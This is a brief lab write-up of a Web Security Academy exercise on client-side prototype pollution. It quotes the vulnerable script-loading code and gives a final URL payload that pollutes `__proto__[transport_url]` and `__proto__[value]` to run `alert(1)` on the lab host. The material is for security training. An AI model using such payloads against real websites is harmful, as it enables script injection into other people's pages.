# Lab: Client-side prototype pollution via browser APIs
First, I injected `&__proto__[foo]=bar` into the url and observed that `Object.prototype` now includes a foo property.
Looking at the code, I noticed 
```js
let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
if(config.transport_url) {
    let script = document.createElement('script');
    script.src = config.transport_url;
    document.body.appendChild(script);
    }
```
Here, we can set prototype.value to set a default value for transport url.

Hherefore, final payload: `https://0a1c009304b1e614806bef8c00bd00c5.web-security-academy.net/?search=test123&__proto__[transport_url]=data:,alert(1)&__proto__[value]=data:,alert(1)`